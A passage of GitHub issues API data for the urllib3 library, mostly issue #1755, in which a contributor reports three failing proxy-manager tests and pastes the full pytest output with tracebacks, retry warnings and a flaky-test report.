_ _\r\n\r\naddress = ('10.255.255.1', 80), timeout = 0.0001, source_address = None\r\n\r\n    def create_connection(address, timeout=_GLOBAL_DEFAULT_TIMEOUT,\r\n                          source_address=None):\r\n        \"\"\"Connect to *address* and return the socket object.\r\n    \r\n        Convenience function.  Connect to *address* (a 2-tuple ``(host,\r\n        port)``) and return the socket object.  Passing the optional\r\n        *timeout* parameter will set the timeout on the socket instance\r\n        before attempting to connect.  If no *timeout* is supplied, the\r\n        global default timeout setting returned by :func:`getdefaulttimeout`\r\n        is used.  If *source_address* is set it must be a tuple of (host, port)\r\n        for the socket to bind as a source address before making the connection.\r\n        A host of '' or port 0 tells the OS to use the default.\r\n        \"\"\"\r\n    \r\n        host, port = address\r\n        err = None\r\n        for res in getaddrinfo(host, port, 0, SOCK_STREAM):\r\n            af, socktype, proto, canonname, sa = res\r\n            sock = None\r\n            try:\r\n                sock = socket(af, socktype, proto)\r\n                if timeout is not _GLOBAL_DEFAULT_TIMEOUT:\r\n                    sock.settimeout(timeout)\r\n                if source_address:\r\n                    sock.bind(source_address)\r\n                sock.connect(sa)\r\n                return sock\r\n    \r\n            except error as _:\r\n                err = _\r\n                if sock is not None:\r\n                    sock.close()\r\n    \r\n        if err is not None:\r\n>           raise err\r\nE           error: [Errno 111] Connection refused\r\n\r\n/usr/lib64/python2.7/socket.py:575: error\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1755", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1755/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1755/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1755/events", "html_url": "https://github.com/urllib3/urllib3/issues/1755", "id": 527155058, "node_id": "MDU6SXNzdWU1MjcxNTUwNTg=", "number": 1755, "title": "3 test failures in git HEAD: TestHTTPProxyManager.test_cross_host_redirect, TestHTTPProxyManager.test_cross_protocol_redirect, TestIPv6HTTPProxyManager.test_basic_ipv6_proxy", "user": {"login": "mgorny", "id": 110765, "node_id": "MDQ6VXNlcjExMDc2NQ==", "avatar_url": "https://avatars1.githubusercontent.com/u/110765?v=4", "gravatar_id": "", "url": "https://api.github.com/users/mgorny", "html_url": "https://github.com/mgorny", "followers_url": "https://api.github.com/users/mgorny/followers", "following_url": "https://api.github.com/users/mgorny/following{/other_user}", "gists_url": "https://api.github.com/users/mgorny/gists{/gist_id}", "starred_url": "https://api.github.com/users/mgorny/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/mgorny/subscriptions", "organizations_url": "https://api.github.com/users/mgorny/orgs", "repos_url": "https://api.github.com/users/mgorny/repos", "events_url": "https://api.github.com/users/mgorny/events{/privacy}", "received_events_url": "https://api.github.com/users/mgorny/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 6, "created_at": "2019-11-22T11:57:56Z", "updated_at": "2019-12-02T21:12:42Z", "closed_at": "2019-12-02T14:49:19Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "I suspect it doesn't like something about my system but I really don't know what it is it doesn't like.\r\n\r\n```\r\n$ nox\r\nnox > Running session test-2.7\r\nnox > Creating virtual environment (virtualenv) using python2.7 in .nox/test-2-7\r\nnox > pip install -r dev-requirements.txt\r\nnox > pip install .[socks,secure,brotli]\r\nnox > pip --version\r\npip 19.3.1 from /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/pip (python 2.7)\r\nnox > python --version\r\nPython 2.7.17\r\nnox > python -c import struct; print(struct.calcsize('P') * 8)\r\n64\r\nnox > python -m OpenSSL.debug\r\npyOpenSSL: 19.1.0\r\ncryptography: 2.8\r\ncffi: 1.13.2\r\ncryptography's compiled against OpenSSL: OpenSSL 1.1.1d  10 Sep 2019\r\ncryptography's linked OpenSSL: OpenSSL 1.1.1d  10 Sep 2019\r\nPythons's OpenSSL: OpenSSL 1.1.1d  10 Sep 2019\r\nPython executable: /tmp/urllib3/.nox/test-2-7/bin/python\r\nPython version: 2.7.17 (default, Nov 11 2019, 18:48:18) \r\n[GCC 9.2.0]\r\nPlatform: linux2\r\nsys.path: ['', '/tmp/urllib3/.nox/test-2-7/lib64/python27.zip', '/tmp/urllib3/.nox/test-2-7/lib64/python2.7', '/tmp/urllib3/.nox/test-2-7/lib64/python2.7/plat-linux2', '/tmp/urllib3/.nox/test-2-7/lib64/python2.7/lib-tk', '/tmp/urllib3/.nox/test-2-7/lib64/python2.7/lib-old', '/tmp/urllib3/.nox/test-2-7/lib64/python2.7/lib-dynload', '/usr/lib64/python2.7', '/usr/lib/python2.7', '/usr/lib64/python2.7/lib-tk', '/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages']\r\nnox > coverage run --parallel-mode -m pytest -r a --tb=native --no-success-flaky-report test/\r\n=============================================================== test session starts ===============================================================\r\nplatform linux2 -- Python 2.7.17, pytest-4.6.6, py-1.8.0, pluggy-0.13.1\r\nrootdir: /tmp/urllib3, inifile: setup.cfg\r\nplugins: flaky-3.6.1, timeout-1.3.3\r\ncollected 1317 items                                                                                                                              \r\n\r\ntest/test_collections.py .....................................                                                                              [  2%]\r\ntest/test_compatibility.py ...                                                                                                              [  3%]\r\ntest/test_connection.py .....                                                                                                               [  3%]\r\ntest/test_connectionpool.py .......................................................................                                         [  8%]\r\ntest/test_exceptions.py .............                                                                                                       [  9%]\r\ntest/test_fields.py ...............                                                                                                         [ 10%]\r\ntest/test_filepost.py ...........                                                                                                           [ 11%]\r\ntest/test_no_ssl.py ..                                                                                                                      [ 11%]\r\ntest/test_poolmanager.py .........................                                                                                          [ 13%]\r\ntest/test_proxymanager.py ...                                                                                                               [ 14%]\r\ntest/test_queue_monkeypatch.py .                                                                                                            [ 14%]\r\ntest/test_response.py ................................................................                                                      [ 18%]\r\ntest/test_retry.py .....................................                                                                                    [ 21%]\r\ntest/test_ssl.py ..................................                                                                                         [ 24%]\r\ntest/test_util.py ......................................................................................................................... [ 33%]\r\n..............................................................s.s...s.......................................................                [ 42%]\r\ntest/test_wait.py .............                                                                                                             [ 43%]\r\ntest/contrib/test_pyopenssl.py ....................................s.s......No handlers could be found for logger \"tornado.application\"\r\n............................................................... [ 52%]\r\n.................................................................................................                                           [ 59%]\r\ntest/contrib/test_pyopenssl_dependencies.py ..                                                                                              [ 59%]\r\ntest/contrib/test_securetransport.py ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss [ 67%]\r\nsssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                                                                               [ 72%]\r\ntest/contrib/test_socks.py ..................                                                                                               [ 73%]\r\ntest/with_dummyserver/test_chunked_transfer.py ...........                                                                                  [ 74%]\r\ntest/with_dummyserver/test_connectionpool.py ...................................................................                            [ 79%]\r\ntest/with_dummyserver/test_https.py ................................s.s.................................................................... [ 87%]\r\n............................................................................                                                                [ 92%]\r\ntest/with_dummyserver/test_no_ssl.py ..                                                                                                     [ 93%]\r\ntest/with_dummyserver/test_poolmanager.py .......................                                                                           [ 94%]\r\ntest/with_dummyserver/test_proxy_poolmanager.py ......FF.......F                                                                            [ 96%]\r\ntest/with_dummyserver/test_socketlevel.py ....................................s....sss........                                              [100%]\r\n\r\n==================================================================== FAILURES =====================================================================\r\n__________________________________________________ TestHTTPProxyManager.test_cross_host_redirect __________________________________________________\r\nTraceback (most recent call last):\r\n  File \"/tmp/urllib3/test/with_dummyserver/test_proxy_poolmanager.py\", line 148, in test_cross_host_redirect\r\n    retries=1,\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py\", line 76, in request\r\n    method, url, fields=fields, headers=headers, **urlopen_kw\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py\", line 97, in request_encode_url\r\n    return self.urlopen(method, url, **extra_kw)\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py\", line 466, in urlopen\r\n    return super(ProxyManager, self).urlopen(method, url, redirect=redirect, **kw)\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py\", line 328, in urlopen\r\n    response = conn.urlopen(method, url, **kw)\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py\", line 760, in urlopen\r\n    **response_kw\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py\", line 720, in urlopen\r\n    method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/util/retry.py\", line 436, in increment\r\n    raise MaxRetryError(_pool, url, error or ResponseError(cause))\r\nMaxRetryError: HTTPConnectionPool(host='localhost', port=37403): Max retries exceeded with url: http://localhost:44723/redirect?target=http%3A%2F%2F127.0.0.1%3A44723%2Fecho%3Fa%3Db (Caused by ReadTimeoutError(\"HTTPConnectionPool(host='localhost', port=37403): Read timed out. (read timeout=0.01)\",))\r\n-------------------------------------------------------------- Captured stdout call ---------------------------------------------------------------\r\nRetrying (Retry(total=0, connect=None, read=None, redirect=0, status=None)) after connection broken by 'ReadTimeoutError(\"HTTPConnectionPool(host='localhost', port=37403): Read timed out. (read timeout=0.01)\",)': http://localhost:44723/redirect?target=http%3A%2F%2F127.0.0.1%3A44723%2Fecho%3Fa%3Db\r\nRetrying (Retry(total=0, connect=None, read=None, redirect=0, status=None)) after connection broken by 'ReadTimeoutError(\"HTTPConnectionPool(host='localhost', port=37403): Read timed out. (read timeout=0.01)\",)': http://localhost:44723/redirect?target=http%3A%2F%2F127.0.0.1%3A44723%2Fecho%3Fa%3Db\r\n---------------------------------------------------------------- Captured log call ----------------------------------------------------------------\r\nWARNING  urllib3.connectionpool:connectionpool.py:745 Retrying (Retry(total=0, connect=None, read=None, redirect=0, status=None)) after connection broken by 'ReadTimeoutError(\"HTTPConnectionPool(host='localhost', port=37403): Read timed out. (read timeout=0.01)\",)': http://localhost:44723/redirect?target=http%3A%2F%2F127.0.0.1%3A44723%2Fecho%3Fa%3Db\r\n-------------------------------------------------------------- Captured stdout call ---------------------------------------------------------------\r\nRetrying (Retry(total=0, connect=None, read=None, redirect=0, status=None)) after connection broken by 'ReadTimeoutError(\"HTTPConnectionPool(host='localhost', port=37403): Read timed out. (read timeout=0.01)\",)': http://localhost:44723/redirect?target=http%3A%2F%2F127.0.0.1%3A44723%2Fecho%3Fa%3Db\r\nRetrying (Retry(total=0, connect=None, read=None, redirect=0, status=None)) after connection broken by 'ReadTimeoutError(\"HTTPConnectionPool(host='localhost', port=37403): Read timed out. (read timeout=0.01)\",)': http://localhost:44723/redirect?target=http%3A%2F%2F127.0.0.1%3A44723%2Fecho%3Fa%3Db\r\n---------------------------------------------------------------- Captured log call ----------------------------------------------------------------\r\nWARNING  urllib3.connectionpool:connectionpool.py:745 Retrying (Retry(total=0, connect=None, read=None, redirect=0, status=None)) after connection broken by 'ReadTimeoutError(\"HTTPConnectionPool(host='localhost', port=37403): Read timed out. (read timeout=0.01)\",)': http://localhost:44723/redirect?target=http%3A%2F%2F127.0.0.1%3A44723%2Fecho%3Fa%3Db\r\n________________________________________________ TestHTTPProxyManager.test_cross_protocol_redirect ________________________________________________\r\nTraceback (most recent call last):\r\n  File \"/tmp/urllib3/test/with_dummyserver/test_proxy_poolmanager.py\", line 169, in test_cross_protocol_redirect\r\n    retries=1,\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py\", line 76, in request\r\n    method, url, fields=fields, headers=headers, **urlopen_kw\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py\", line 97, in request_encode_url\r\n    return self.urlopen(method, url, **extra_kw)\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py\", line 466, in urlopen\r\n    return super(ProxyManager, self).urlopen(method, url, redirect=redirect, **kw)\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py\", line 328, in urlopen\r\n    response = conn.urlopen(method, url, **kw)\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py\", line 760, in urlopen\r\n    **response_kw\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py\", line 720, in urlopen\r\n    method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/util/retry.py\", line 436, in increment\r\n    raise MaxRetryError(_pool, url, error or ResponseError(cause))\r\nMaxRetryError: HTTPConnectionPool(host='localhost', port=37403): Max retries exceeded with url: http://localhost:44723/redirect?target=https%3A%2F%2Flocalhost%3A45413%2Fecho%3Fa%3Db (Caused by ReadTimeoutError(\"HTTPConnectionPool(host='localhost', port=37403): Read timed out. (read timeout=0.01)\",))\r\n-------------------------------------------------------------- Captured stdout call ---------------------------------------------------------------\r\nRetrying (Retry(total=0, connect=None, read=None, redirect=0, status=None)) after connection broken by 'ReadTimeoutError(\"HTTPConnectionPool(host='localhost', port=37403): Read timed out. (read timeout=0.01)\",)': http://localhost:44723/redirect?target=https%3A%2F%2Flocalhost%3A45413%2Fecho%3Fa%3Db\r\nRetrying (Retry(total=0, connect=None, read=None, redirect=0, status=None)) after connection broken by 'ReadTimeoutError(\"HTTPConnectionPool(host='localhost', port=37403): Read timed out. (read timeout=0.01)\",)': http://localhost:44723/redirect?target=https%3A%2F%2Flocalhost%3A45413%2Fecho%3Fa%3Db\r\n---------------------------------------------------------------- Captured log call ----------------------------------------------------------------\r\nWARNING  urllib3.connectionpool:connectionpool.py:745 Retrying (Retry(total=0, connect=None, read=None, redirect=0, status=None)) after connection broken by 'ReadTimeoutError(\"HTTPConnectionPool(host='localhost', port=37403): Read timed out. (read timeout=0.01)\",)': http://localhost:44723/redirect?target=https%3A%2F%2Flocalhost%3A45413%2Fecho%3Fa%3Db\r\n-------------------------------------------------------------- Captured stdout call ---------------------------------------------------------------\r\nRetrying (Retry(total=0, connect=None, read=None, redirect=0, status=None)) after connection broken by 'ReadTimeoutError(\"HTTPConnectionPool(host='localhost', port=37403): Read timed out. (read timeout=0.01)\",)': http://localhost:44723/redirect?target=https%3A%2F%2Flocalhost%3A45413%2Fecho%3Fa%3Db\r\nRetrying (Retry(total=0, connect=None, read=None, redirect=0, status=None)) after connection broken by 'ReadTimeoutError(\"HTTPConnectionPool(host='localhost', port=37403): Read timed out. (read timeout=0.01)\",)': http://localhost:44723/redirect?target=https%3A%2F%2Flocalhost%3A45413%2Fecho%3Fa%3Db\r\n---------------------------------------------------------------- Captured log call ----------------------------------------------------------------\r\nWARNING  urllib3.connectionpool:connectionpool.py:745 Retrying (Retry(total=0, connect=None, read=None, redirect=0, status=None)) after connection broken by 'ReadTimeoutError(\"HTTPConnectionPool(host='localhost', port=37403): Read timed out. (read timeout=0.01)\",)': http://localhost:44723/redirect?target=https%3A%2F%2Flocalhost%3A45413%2Fecho%3Fa%3Db\r\n_________________________________________________ TestIPv6HTTPProxyManager.test_basic_ipv6_proxy __________________________________________________\r\nTraceback (most recent call last):\r\n  File \"/tmp/urllib3/test/with_dummyserver/test_proxy_poolmanager.py\", line 361, in test_basic_ipv6_proxy\r\n    r = http.request(\"GET\", \"%s/\" % self.http_url)\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py\", line 76, in request\r\n    method, url, fields=fields, headers=headers, **urlopen_kw\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py\", line 97, in request_encode_url\r\n    return self.urlopen(method, url, **extra_kw)\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py\", line 466, in urlopen\r\n    return super(ProxyManager, self).urlopen(method, url, redirect=redirect, **kw)\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py\", line 328, in urlopen\r\n    response = conn.urlopen(method, url, **kw)\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py\", line 760, in urlopen\r\n    **response_kw\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py\", line 760, in urlopen\r\n    **response_kw\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py\", line 760, in urlopen\r\n    **response_kw\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py\", line 720, in urlopen\r\n    method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/util/retry.py\", line 436, in increment\r\n    raise MaxRetryError(_pool, url, error or ResponseError(cause))\r\nMaxRetryError: HTTPConnectionPool(host='::1', port=34131): Max retries exceeded with url: http://localhost:38465/ (Caused by ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f8cb8442c50>: Failed to establish a new connection: [Errno 111] Connection refused',)))\r\n-------------------------------------------------------------- Captured stdout call ---------------------------------------------------------------\r\nRetrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f8cb8501990>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:37661/\r\nRetrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f8cb8501990>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:37661/\r\nRetrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f8cb8572750>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:37661/\r\nRetrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f8cb8572750>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:37661/\r\nRetrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f8cb84fb910>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:37661/\r\nRetrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f8cb84fb910>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:37661/\r\n---------------------------------------------------------------- Captured log call ----------------------------------------------------------------\r\nWARNING  urllib3.connectionpool:connectionpool.py:745 Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f8cb8501990>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:37661/\r\nWARNING  urllib3.connectionpool:connectionpool.py:745 Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f8cb8572750>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:37661/\r\nWARNING  urllib3.connectionpool:connectionpool.py:745 Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f8cb84fb910>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:37661/\r\n-------------------------------------------------------------- Captured stdout call ---------------------------------------------------------------\r\nRetrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f8cb8484150>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:38465/\r\nRetrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f8cb8484150>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:38465/\r\nRetrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f8cb8484050>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:38465/\r\nRetrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f8cb8484050>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:38465/\r\nRetrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f8cb8442810>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:38465/\r\nRetrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f8cb8442810>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:38465/\r\n---------------------------------------------------------------- Captured log call ----------------------------------------------------------------\r\nWARNING  urllib3.connectionpool:connectionpool.py:745 Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f8cb8484150>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:38465/\r\nWARNING  urllib3.connectionpool:connectionpool.py:745 Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f8cb8484050>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:38465/\r\nWARNING  urllib3.connectionpool:connectionpool.py:745 Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f8cb8442810>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:38465/\r\n================================================================ warnings summary =================================================================\r\ntest/test_ssl.py::test_context_sni_with_ip_address[False-www.python.org-False]\r\n  /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/util/ssl_.py:380: SNIMissingWarning: An HTTPS request has been made, but the SNI (Server Name Indication) extension to TLS is not available on this platform. This may cause the server to present an incorrect TLS certificate, which can cause validation failures. You can upgrade to a newer version of Python to solve this. For more information, see https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings\r\n    SNIMissingWarning,\r\n\r\ntest/contrib/test_pyopenssl.py::TestHTTPS::test_https_timeout\r\ntest/contrib/test_pyopenssl.py::TestHTTPS::test_tunnel\r\ntest/contrib/test_pyopenssl.py::TestHTTPS_TLSv1::test_https_timeout\r\ntest/contrib/test_pyopenssl.py::TestHTTPS_TLSv1::test_tunnel\r\ntest/contrib/test_pyopenssl.py::TestHTTPS_TLSv1_1::test_https_timeout\r\ntest/contrib/test_pyopenssl.py::TestHTTPS_TLSv1_1::test_tunnel\r\ntest/contrib/test_pyopenssl.py::TestHTTPS_TLSv1_2::test_https_timeout\r\ntest/contrib/test_pyopenssl.py::TestHTTPS_TLSv1_2::test_tunnel\r\ntest/contrib/test_pyopenssl.py::TestHTTPS_TLSv1_3::test_https_timeout\r\ntest/contrib/test_pyopenssl.py::TestHTTPS_TLSv1_3::test_tunnel\r\ntest/with_dummyserver/test_https.py::TestHTTPS::test_https_timeout\r\ntest/with_dummyserver/test_https.py::TestHTTPS::test_tunnel\r\ntest/with_dummyserver/test_https.py::TestHTTPS_TLSv1::test_https_timeout\r\ntest/with_dummyserver/test_https.py::TestHTTPS_TLSv1::test_tunnel\r\ntest/with_dummyserver/test_https.py::TestHTTPS_TLSv1_1::test_https_timeout\r\ntest/with_dummyserver/test_https.py::TestHTTPS_TLSv1_1::test_tunnel\r\ntest/with_dummyserver/test_https.py::TestHTTPS_TLSv1_2::test_https_timeout\r\ntest/with_dummyserver/test_https.py::TestHTTPS_TLSv1_2::test_tunnel\r\ntest/with_dummyserver/test_https.py::TestHTTPS_TLSv1_3::test_https_timeout\r\ntest/with_dummyserver/test_https.py::TestHTTPS_TLSv1_3::test_tunnel\r\ntest/with_dummyserver/test_no_ssl.py::TestHTTPSWithoutSSL::test_simple\r\ntest/with_dummyserver/test_proxy_poolmanager.py::TestHTTPProxyManager::test_proxy_pooling\r\ntest/with_dummyserver/test_proxy_poolmanager.py::TestHTTPProxyManager::test_proxy_pooling\r\ntest/with_dummyserver/test_proxy_poolmanager.py::TestHTTPProxyManager::test_proxy_pooling\r\ntest/with_dummyserver/test_proxy_poolmanager.py::TestHTTPProxyManager::test_proxy_pooling\r\ntest/with_dummyserver/test_socketlevel.py::TestProxyManager::test_connect_ipv6_addr\r\n  /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:1004: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings\r\n    InsecureRequestWarning,\r\n\r\ntest/contrib/test_pyopenssl.py::TestHTTPS_IPv6Addr::test_strip_square_brackets_before_validating\r\ntest/with_dummyserver/test_https.py::TestHTTPS_IPv6Addr::test_strip_square_brackets_before_validating\r\n  /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connection.py:384: SubjectAltNameWarning: Certificate for ::1 has no `subjectAltName`, falling back to check for a `commonName` for now. This feature is being removed by major browsers and deprecated by RFC 2818. (See https://github.com/urllib3/urllib3/issues/497 for details.)\r\n    SubjectAltNameWarning,\r\n\r\ntest/contrib/test_pyopenssl.py::TestSNI::test_hostname_in_first_request_packet\r\n  /tmp/urllib3/dummyserver/server.py:128: NoIPv6Warning: No IPv6 support. Falling back to IPv4.\r\n    warnings.warn(\"No IPv6 support. Falling back to IPv4.\", NoIPv6Warning)\r\n\r\ntest/with_dummyserver/test_connectionpool.py::TestConnectionPool::test_source_address\r\n  /tmp/urllib3/test/with_dummyserver/test_connectionpool.py:688: NoIPv6Warning: No IPv6 support: skipping.\r\n    warnings.warn(\"No IPv6 support: skipping.\", NoIPv6Warning)\r\n\r\n-- Docs: https://docs.pytest.org/en/latest/warnings.html\r\n===Flaky Test Report===\r\n\r\ntest_cross_host_redirect failed (1 runs remaining out of 2).\r\n\t<class 'urllib3.exceptions.MaxRetryError'>\r\n\tHTTPConnectionPool(host='localhost', port=37403): Max retries exceeded with url: http://localhost:44723/redirect?target=http%3A%2F%2F127.0.0.1%3A44723%2Fecho%3Fa%3Db (Caused by ReadTimeoutError(\"HTTPConnectionPool(host='localhost', port=37403): Read timed out. (read timeout=0.01)\",))\r\n\t[<TracebackEntry /tmp/urllib3/test/with_dummyserver/test_proxy_poolmanager.py:148>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:76>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:97>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py:466>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py:328>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:760>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:720>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/util/retry.py:436>]\r\ntest_cross_host_redirect failed; it passed 0 out of the required 1 times.\r\n\t<class 'urllib3.exceptions.MaxRetryError'>\r\n\tHTTPConnectionPool(host='localhost', port=37403): Max retries exceeded with url: http://localhost:44723/redirect?target=http%3A%2F%2F127.0.0.1%3A44723%2Fecho%3Fa%3Db (Caused by ReadTimeoutError(\"HTTPConnectionPool(host='localhost', port=37403): Read timed out. (read timeout=0.01)\",))\r\n\t[<TracebackEntry /tmp/urllib3/test/with_dummyserver/test_proxy_poolmanager.py:148>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:76>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:97>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py:466>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py:328>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:760>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:720>, <TracebackEntry 